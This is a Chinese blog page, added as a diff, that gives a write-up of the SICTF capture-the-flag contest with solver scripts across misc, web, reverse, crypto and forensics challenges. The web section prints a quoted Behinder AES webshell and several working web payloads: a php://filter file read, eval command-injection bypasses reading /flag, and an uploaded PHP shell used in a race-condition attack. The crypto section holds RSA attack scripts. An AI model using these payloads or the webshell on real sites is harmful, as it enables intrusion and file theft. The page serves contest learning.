@@ -1,0 +1,1049 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="wp" />
+
+
+<link rel="canonical" href="http://example.com/2023/09/10/sictf-wp/">
+
+
+
+  <title>
+sictf_wp - Write_up |
+yhuanhuan =  = 不在能知，乃在能行</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">sictf_wp
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-09-10 19:48:34">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-09-10T19:48:34+08:00">2023-09-10</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>15k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>13 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">yhuanhuan</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/nUh9xrjosZA6KBg.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/1worZdUHTMtXeP3.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/jzioFL8AndHwO3Q.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/vuBAH4kaJFtdgoC.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/tNd3AzOayGcXsCk.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/NsekliFKc53mr67.png"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Write-up/" itemprop="item" rel="index" title="分类于 Write_up"><span itemprop="name">Write_up</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/10/sictf-wp/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/huanhuan.png">
+    <meta itemprop="name" content="yhuanhuan">
+    <meta itemprop="description" content="不在能知，乃在能行, 欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> MISC</h1>
+<h3 id="签到welcome"><a class="markdownIt-Anchor" href="#签到welcome">#</a> 签到] Welcome</h3>
+<p><img data-src="/img/sictfpic/1.png" alt="img"></p>
+<h3 id="pixel_art"><a class="markdownIt-Anchor" href="#pixel_art">#</a> Pixel_art</h3>
+<pre><code class="language-PHP">from PIL import Image
+image = Image.open('image.png')
+width, height = image.size
+for y in range(height):
+    for x in range(width):
+        r, g, b = image.getpixel((x, y))
+        if r == 46:
+            print('.',end=&quot;&quot;)
+        elif r == 33:
+            print('!',end=&quot;&quot;)
+        elif r == 63:
+            print('?',end=&quot;&quot;)
+        if g == 46:
+                print('.',end=&quot;&quot;)
+        elif g == 33:
+                print('!',end=&quot;&quot;)
+        elif g == 63:
+                print('?',end=&quot;&quot;)
+        if b == 46:
+            print('.',end=&quot;&quot;)
+        elif b == 33:
+            print('!',end=&quot;&quot;)
+        elif b == 63:
+            print('?',end=&quot;&quot;)
+</code></pre>
+<pre><code class="language-asp">..................!?!!.?..................?.?!.?....!.?.......!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?.........!?!!.?........?.?!.?..!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?...............!?!!.?..............?.?!.?........!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!...!.......!.!!!!!!!.?.............!?!!.?............?.?!.?........................!.....!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!.....!.!!!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?..............!.!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!.................!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!...............!.?.............!?!!.?............?.?!.?......................!.....!.!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!.............!.!!!!!!!!!!!!!!!!!!!...........!.!.............!.!!!!!!!!!!!!!!!!!...........!.?...............!?!!.?..............?.?!.?!.!!!!!.!!!!!.......!.!!!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?.................!?!!.?................?.?!.?............!.?.
+
+ Ook
+</code></pre>
+<h3 id="baby_zip"><a class="markdownIt-Anchor" href="#baby_zip">#</a> baby_zip</h3>
+<pre><code class="language-PHP">bkcrack -C flag.zip -c flag.png -x 0 89504E470D0A1A0A0000000D49484452
+bkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png
+</code></pre>
+<p>010 查看 flag 在最后</p>
+<h3 id="easy_shark"><a class="markdownIt-Anchor" href="#easy_shark">#</a> Easy_Shark</h3>
+<p>AES 冰蝎 3 流量的特征</p>
+<pre><code class="language-PHP">&lt;?php
+@error_reporting(0);
+session_start();
+    $key=&quot;2295d22e2d70888f&quot;;
+        $_SESSION['k']=$key;
+        $post=file_get_contents(&quot;php://input&quot;);
+        if(!extension_loaded('openssl'))
+        &#123;
+                $t=&quot;base64_&quot;.&quot;decode&quot;;
+                $post=$t($post.&quot;&quot;);
+                
+                for($i=0;$i&lt;strlen($post);$i++) &#123;
+                             $post[$i] = $post[$i]^$key[$i+1&amp;15]; 
+                            &#125;
+        &#125;
+        else
+        &#123;
+                $post=openssl_decrypt($post, &quot;AES128&quot;, $key);
+        &#125;
+    $arr=explode('|',$post);
+    $func=$arr[0];
+    $params=$arr[1];
+        class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;
+    @call_user_func(new C(),$params);
+?&gt;
+key = '2295d22e2d70888f'
+</code></pre>
+<p><img data-src="/img/sictfpic/2.png" alt="img"></p>
+<p>解冰蝎流量</p>
+<p><img data-src="/img/sictfpic/3.png" alt="img"></p>
+<p><img data-src="/img/sictfpic/4.png" alt="img"></p>
+<p><img data-src="/img/sictfpic/5.png" alt="img"></p>
+<p>Gron 解密</p>
+<pre><code class="language-PHP">def decrypt_string(ciphertext, offsets):
+    decrypted_string = &quot;&quot;
+    offset_index = 0
+
+    for char in ciphertext:
+        offset = offsets[offset_index] % 26
+        decrypted_char_code = (ord(char) - ord('A') - offset) % 26 + ord('A')
+        decrypted_char = chr(decrypted_char_code)
+        decrypted_string += decrypted_char
+
+        offset_index = (offset_index + 1) % len(offsets)
+
+    return decrypted_string
+
+ciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;
+offsets = [1, 50, 61, 8, 9, 20, 63, 41]
+
+while True:
+    decrypted_string = decrypt_string(ciphertext, offsets)
+    print(decrypted_string)
+</code></pre>
+<h3 id="fast_morse"><a class="markdownIt-Anchor" href="#fast_morse">#</a> fast_morse</h3>
+<p>morse 解密</p>
+<p><img data-src="/img/sictfpic/6.png" alt="img"></p>
+<p>得到 falg</p>
+<p><img data-src="/img/sictfpic/7.png" alt="img"></p>
+<p>变成小写</p>
+<p>flag:SICTF f2a098f-7f4a-93a5-c8a48360b03c}</p>
+<h3 id="qr_qr_qr"><a class="markdownIt-Anchor" href="#qr_qr_qr">#</a> QR_QR_QR</h3>
+<pre><code class="language-Python">import numpy as np
+import matplotlib.pyplot as plt
+from pyzbar.pyzbar import decode
+from PIL import Image
+from pwn import *
+
+# 设置日志级别为调试模式
+context(log_level='debug')
+
+# 创建图片函数
+def create_image(file_path):
+    with open(file_path, 'r') as file:
+        lines = file.readlines()
+
+    # 生成图片数组
+    image_array = [[255 if bit == '1' else 0 for bit in line.strip()] for line in lines]
+    image_array = np.array(image_array, dtype=np.uint8)
+
+    # 保存为图片
+    plt.imsave('output.png', image_array, cmap='gray')
+
+# 读取二维码函数
+def read_qr_code(image_path):
+    image = Image.open(image_path)
+    decoded_objects = decode(image)
+    for obj in decoded_objects:
+        return obj.data.decode('utf-8')
+
+# 连接服务器
+conn = remote('210.44.151.51', 10523)
+
+while True:
+    try:
+        # 从服务器接收数据
+        data = conn.recvuntil('Please Decrypt this QR code:', drop=True)
+
+        # 将数据保存到文本文件
+        with open('1.txt', 'w') as file:
+            file.write(data.decode())
+
+        # 从文本文件创建图片
+        create_image('1.txt')
+
+        # 读取图片中的二维码
+        code = read_qr_code('output.png')
+        print(code)
+
+        # 发送二维码到服务器
+        conn.sendline(str(code))
+        conn.recvline()
+    finally:
+        # 关闭文件
+        file.close()
+</code></pre>
+<h3 id="问卷调查"><a class="markdownIt-Anchor" href="#问卷调查">#</a> 问卷调查</h3>
+<p>第三道就是 flag</p>
+<p>SICTF SICTF_Round3_will_do_even_better!}</p>
+<h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> WEB</h1>
+<h3 id="签到include"><a class="markdownIt-Anchor" href="#签到include">#</a> [签到] Include</h3>
+<p>利用伪协议可直接读到 flag</p>
+<pre><code class="language-Python">    /?SICTF=php://filter/convert.base64-encode/resource=/flag
+</code></pre>
+<h3 id="baby_php"><a class="markdownIt-Anchor" href="#baby_php">#</a> Baby_PHP</h3>
+<pre><code class="language-PHP">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+
+$query = $_SERVER['QUERY_STRING'];
+
+if (preg_match('/_|%5f|\.|%2E/i', $query)) &#123;
+    die('You are Hacker!');
+&#125;
+if($_GET['k_e_y'] !=='123' &amp;&amp; preg_match('/^123$/',$_GET['k_e_y']))&#123;
+    echo(&quot;You are will Win!&lt;br&gt;&quot;);
+    if(isset($_POST['command']))&#123;
+        $command = $_POST['command'];
+        if(!preg_match(&quot;/\~|\`|\@|\#|\\$|\%|\&amp;|\*|\（|\）|\-|\+|\=|\&#123;|\&#125;|\[|\]|\:|\'|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;,$command))&#123;
+            eval($command);
+        &#125;
+        else&#123;
+            echo(&quot;You are Hacker!&quot;);
+        &#125;
+    &#125;
+&#125;
+else&#123;
+    echo(&quot;K_e_y is Errors!&quot;);
+&#125;K_e_y is Errors!
+</code></pre>
+<p>代码开始会对输入的字符串进行正则匹配，跟_有关的 url 编码之类的全部过滤</p>
+<p>可以用空格或者。代替_,. 又被过滤了，用了空格，后面一个简单的若比较换行符绕过</p>
+<p>后面 cmd 一个无数字字母 rce</p>
+<p>可见 ctfshow  web40 的题解</p>
+<pre><code class="language-Plain">/?k%20e%20y=123%0a
+command=show_source(next(array_reverse(scandir(pos(localeconv())))));
+</code></pre>
+<h3 id="rce"><a class="markdownIt-Anchor" href="#rce">#</a> RCE</h3>
+<pre><code class="language-Plain">&lt;?php 
+error_reporting(0); 
+highlight_file(__FILE__); 
+$code = $_POST['code']; 
+$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code); 
+$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code); 
+eval($code); 
+?&gt;
+</code></pre>
+<p>借鉴宏爷文章</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYzOTI4Nzk2L2FydGljbGUvZGV0YWlscy8xMjc5NjMwNzk=">https://blog.csdn.net/qq_63928796/article/details/127963079</span></p>
+<pre><code class="language-PHP">code=echo $_POST[1];&amp;1=cat /f*
+</code></pre>
+<h3 id="我全都要"><a class="markdownIt-Anchor" href="#我全都要">#</a> 我全都要</h3>
+<p>POP</p>
+<pre><code class="language-PHP">&lt;?php
+highlight_file(__FILE__);
+
+class B&#123;
+    public $pop = '233333333';
+    public $i = '1';
+    public $nogame;
+
+    public function __destruct()
+    &#123;
+        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;
+            echo &quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;;
+        &#125;
+    &#125;
+
+    public function game()&#123;
+        echo &quot;扣1送地狱火&quot;;
+        if ($this-&gt;i = &quot;1&quot;)&#123;
+            echo '&lt;img src=\'R.jpg\'&gt;';
+            $this-&gt;nogame-&gt;love();
+        &#125;
+    &#125;
+
+    public function __clone()&#123;
+        echo &quot;必须执行&quot;;
+        eval($_POST[&quot;cmd&quot;]);
+    &#125;
+&#125;
+
+
+class A&#123;
+    public $Aec;
+    public $girl = 'QNKCDZO' ;
+    public $boy = '240610708';
+
+    public function __toString()
+    &#123;
+        echo &quot;I also want to fall in love&quot;;
+        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;
+            $this-&gt;Aec-&gt;game();
+        &#125;
+    &#125;
+
+
+&#125;
+
+
+class P&#123;
+    public $MyLover;
+    public $name = '1';
+    public function __call($name, $arguments)
+    &#123;
+        echo &quot;有对象我会在这打CTF???看我克隆一个对象！&quot;;
+        if ($name != &quot;game&quot;) &#123;
+            echo &quot;打游戏去，别想着对象了&quot;;
+            $this-&gt;MyLover = clone new B;
+        &#125;
+    &#125;
+
+
+&#125;
+$a = new B();
+$a -&gt;pop = new A();
+$a -&gt;pop -&gt;Aec = new B();
+$a -&gt;pop -&gt;Aec -&gt; nogame = new P();
+echo serialize($a);
+</code></pre>
+<p>然后命令执行</p>
+<p>cmd=</p>
+<h3 id="你能跟得上我的speed吗"><a class="markdownIt-Anchor" href="#你能跟得上我的speed吗">#</a> 你能跟得上我的 speed 吗</h3>
+<p>条件竞争</p>
+<p>准备一个 php 文件</p>
+<p>内容为</p>
+<pre><code>&lt;?php @eval(system(&quot;cat /flag&quot;));?&gt;
+</code></pre>
+<p>抓两个包</p>
+<p>一个为 get 传参的包，访问 url/uploads/2.php, 抓包</p>
+<p>另一个为 post 包，直接就抓上传的包，如下</p>
+<p><img data-src="/img/sictfpic/8.png" alt="img"></p>
+<p>俩个包用 burp 爆破，爆破方式为 noplayload，开跑</p>
+<p><img data-src="/img/sictfpic/9.png" alt="img"></p>
+<h1 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Re</h1>
+<h3 id="签到pyc"><a class="markdownIt-Anchor" href="#签到pyc">#</a> [签到] PYC</h3>
+<p><img data-src="/img/sictfpic/10.png" alt="img"></p>
+<h3 id="myobject"><a class="markdownIt-Anchor" href="#myobject">#</a> Myobject</h3>
+<p>动调出数据，直接赛博厨子秒了</p>
+<p><img data-src="/img/sictfpic/11.png" alt="img"></p>
+<h3 id="chbase"><a class="markdownIt-Anchor" href="#chbase">#</a> chbase</h3>
+<p>换表加密</p>
+<p><img data-src="/img/sictfpic/12.png" alt="img"></p>
+<p><img data-src="/img/sictfpic/13.png" alt="img"></p>
+<p><img data-src="/img/sictfpic/14.png" alt="img"></p>
+<h3 id="不一样的base64"><a class="markdownIt-Anchor" href="#不一样的base64">#</a> 不一样的 base64</h3>
+<pre><code class="language-Java">BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+
+def base64_decode(encoded_data):
+    decoded_data = ''
+    padding_count = encoded_data.count('=')
+    encoded_data = encoded_data.replace('=', '')
+
+    binary_str = ''
+    for char in encoded_data:
+        decimal_val = BASE64_CHARS.index(char)
+        binary_str += format(decimal_val, '06b')
+
+    if padding_count &gt; 0:
+        binary_str = binary_str[:-padding_count * 2]
+
+    for i in range(0, len(binary_str), 8):
+        byte = binary_str[i:i + 8]
+        decoded_data += chr(int(byte, 2))
+
+    return decoded_data
+
+encoded_data = input('')
+decoded_data = base64_decode(encoded_data)
+print(decoded_data)
+</code></pre>
+<h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn</h1>
+<h3 id="签到shop"><a class="markdownIt-Anchor" href="#签到shop">#</a> [签到] Shop</h3>
+<p><img data-src="/img/sictfpic/15.png" alt="img"></p>
+<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Crypto</h1>
+<h3 id="古典大杂烩"><a class="markdownIt-Anchor" href="#古典大杂烩">#</a> 古典大杂烩</h3>
+<pre><code class="language-PHP">🐩👃🐪🐼👅🐯🐩👈👇👭👟👝🐺🐭👉👙👤👋👚🐪🐫👍👢👮👱🐼👢👨👠👭🐽🐰🐻👚👂👧👠👥👛👮👯👮👬🐾👐👛👌👚👞🐨👏👉👆🐿👆👘👇🐺👦🐸👃🐭👟👑👪👃👁🐻🐻👜🐧👇👊🐧🐾🐼👇🐫🐺👐👆👪🐼👋👌👧🐻👐🐩🐺👥🐽👋👉🐰👎👠👠👣🐧🐫👧🐭👢🐯👑👑🐮👂👏🐻👥👚🐮👋👬👌👥👁👣👅👧👯👦👌👌👍👠👌🐽👉👃👊🐫👉🐨🐮👩👆🐪🐯👘👏👏🐼👩👍👊👍👡👀👰👋👣👨👧👍👜👐👛🐮👘👅👠🐿👂👰👄👈👝👠👤👃👛👘🐭👅👱👆👬👫👥👆🐽👁👐👥👊👇👉👊👩👌👭🐫🐫👬👱🐯👇🐺👁👞👑👙🐮👜👋👘👪👩👚👦👨👀👩👐👉👃🐾👥👀🐫👝👍🐩🐧👰👆👇👨🐪👃🐭👦🐫👱
+</code></pre>
+<p>emjio 解密</p>
+<pre><code class="language-PHP">2L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4z
+</code></pre>
+<p><img data-src="/img/sictfpic/16.png" alt="img"></p>
+<h3 id="radio"><a class="markdownIt-Anchor" href="#radio">#</a> Radio</h3>
+<p><img data-src="/img/sictfpic/17.png" alt="img"></p>
+<h3 id="easy_coppersmith"><a class="markdownIt-Anchor" href="#easy_coppersmith">#</a> Easy_CopperSmith</h3>
+<pre><code class="language-Java">from sage.all import *
+import binascii
+from Crypto.Util.number import *
+
+n =114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381
+cipher =87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810
+
+e2 = 0x10001
+pbits = 512
+for i in range(0,2**4):
+    p4=0x38481379948fa6f1dcedd12e2fb045f096e9978eccc3be2984a9ede4e6ebe1958606c590
+    p4=p4+int(hex(i),16)
+    print(hex(p4))
+    kbits = pbits - p4.nbits()  #未知需要爆破的比特位数
+    print(p4.nbits())
+    p4 = p4 &lt;&lt; kbits
+    PR.&lt;x&gt; = PolynomialRing(Zmod(n))
+    f = x + p4
+    roots = f.small_roots(X=2^kbits, beta=0.4) #进行爆破
+    #print roots
+    if roots:        #爆破成功，求根
+        p = p4+int(roots[0])
+        print(&quot;p: &quot;, hex(int(p)))
+        assert n % p == 0
+        q = n/int(p)
+        print(&quot;q: &quot;, hex(int(q)))
+        print(gcd(p,q))
+        phin = (p-1)*(q-1)
+        print(gcd(e2,phin))
+        d = inverse_mod(e2,phin)
+        print(&quot;d：&quot;,d)
+        flag = pow(cipher,d,n)
+        flag = hex(int(flag))[2:]
+        result = &quot;&quot;
+        for i in range(0, len(flag), 2):
+            hex_int = int(flag[i:i+2], 16)  # 转换为整数
+            result += chr(hex_int)  # 转换为字符并拼接到结果字符串
+        print('result :',result)
+        
+# SICTF 3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;
+</code></pre>
+<h3 id="mingtianpao"><a class="markdownIt-Anchor" href="#mingtianpao">#</a> MingTianPao</h3>
+<pre><code class="language-Python">import codecs
+import numpy as np
+
+def is_character(x):
+    return ord('a') &lt;= x &lt;= ord('z') or ord('A') &lt;= x &lt;= ord('Z')
+
+def xor_strings(s1, s2):
+    return bytes([b1 ^ b2 for b1, b2 in zip(s1, s2)])
+
+def infer_space(index, pos):
+    if message[index, pos] != 0:
+        return
+    message[index, pos] = ord(' ')
+    for x in range(len(ciphertexts)):
+        if x != index:
+            message[x][pos] = xor_strings(ciphertexts[x], ciphertexts[index])[pos] ^ ord(' ')
+
+def find_spaces():
+    for index, x in enumerate(ciphertexts):
+        res = [xor_strings(x, y) for y in ciphertexts if x != y]
+        f = lambda position: len(list(filter(is_character, [s[position] for s in res])))
+        cnt = [f(pos) for pos in range(len(x))]
+        for pos in range(len(x)):
+            space_data.append((f(pos), index, pos))
+
+with open('222.txt', 'r') as file:
+    ciphertexts = [codecs.decode(x.strip().encode(), 'hex') for x in file.readlines()]
+
+message = np.zeros([len(ciphertexts), len(ciphertexts[0])], dtype=int)
+
+space_data = []
+
+find_spaces()
+
+space_data = sorted(space_data, reverse=True)
+for weight, index, pos in space_data:
+    infer_space(index, pos)
+
+print('\n'.join([''.join([chr(c) for c in x]) for x in message]))
+</code></pre>
+<p>得出的结果，猜测第一行数据，异或就可以 Little Red Riding Hood promised Little Red,Rdin+ Hood ppomi4e d to obey de mo8her. Thg gr&amp;n dmother liz ou8 in the&quot;woo#s , a half hcu fr#m the vklla e . When Litxl     Re (Riding&quot;Hoo# entered thi od? a wolf&quot;cam&quot; up to her.,Se d% d not klow 0h nim-l he waq, a) d id #f him.  Goo# day to you   itt e Red Rkdin</p>
+<pre><code class="language-Python">hex_str1 = &quot;1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218&quot;
+hex_str2 = &quot;Little Red Riding Hood promised&quot;
+
+bytes1 = bytes.fromhex(hex_str1)
+bytes2 = bytes(hex_str2, 'utf-8')
+
+result = bytes([a ^ b for a, b in zip(bytes1, bytes2)])
+
+result_str = result.decode('utf-8')
+print(result_str)
+</code></pre>
+<h3 id="small_e"><a class="markdownIt-Anchor" href="#small_e">#</a> small_e</h3>
+<p>低指数加密 /m 高位攻击</p>
+<p><img data-src="/img/sictfpic/18.png" alt="img"></p>
+<pre><code class="language-Python">def phase2(high_m, n, c,e):
+    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation='NTL')
+    m = high_m + x
+    M = m((m^e - c).small_roots()[0])
+    hex_str = hex(int(M))[2:]
+    print(hex_str)
+    return hex_str
+
+n = 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797
+c = 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181
+high_m = 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592
+e = 3
+
+hex_str = phase2(high_m, n, c,e)
+# 将16进制字符串转换为整数
+int_value = Integer('0x' + hex_str)
+
+# 将整数拆分为多个字节，并转换为对应的ASCII字符
+str_value = ''.join(chr(int(hex_str[i:i+2], 16)) for i in range(0, len(hex_str), 2))
+
+print(str_value)
+
+</code></pre>
+<h3 id="签到题来咯"><a class="markdownIt-Anchor" href="#签到题来咯">#</a> 签到题来咯！</h3>
+<pre><code class="language-Python">import libnum
+import binascii
+from  Crypto.Util.number import *
+n = 18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883
+c1 = 3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520
+c2 = 6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931
+def is_prime(n):
+    if n &lt;= 1:
+        return False
+    if n &lt;= 3:
+        return True
+    if n % 2 == 0 or n % 3 == 0:
+        return False
+    i = 5
+    while i * i &lt;= n:
+        if n % i == 0 or n % (i + 2) == 0:
+            return False
+        i += 6
+    return True    
+def franklinReiter(n,e,c1,c2):
+    PR.&lt;x&gt; = PolynomialRing(Zmod(n))
+    g1 = (114*x+2333)^int(e) - c1
+    g2 = (514*x+4555)^int(e) - c2
+    def gcd(g1, g2):
+        while g2:
+            g1, g2 = g2, g1 % g2
+        return g1.monic()
+    return -gcd(g1, g2)[0]
+
+for i in range(1024):
+    if is_prime(i):
+        e = i
+        m=franklinReiter(n,e,c1,c2)
+        print(long_to_bytes((int(m))))
+</code></pre>
+<h1 id="forensics"><a class="markdownIt-Anchor" href="#forensics">#</a> Forensics</h1>
+<h3 id="购物之旅"><a class="markdownIt-Anchor" href="#购物之旅">#</a> 购物之旅</h3>
+<p>SICTF 北京市_顺义区_新顺南大街_北京华联顺义金街购物中心}</p>
+<h3 id="美女姐姐"><a class="markdownIt-Anchor" href="#美女姐姐">#</a> 美女姐姐</h3>
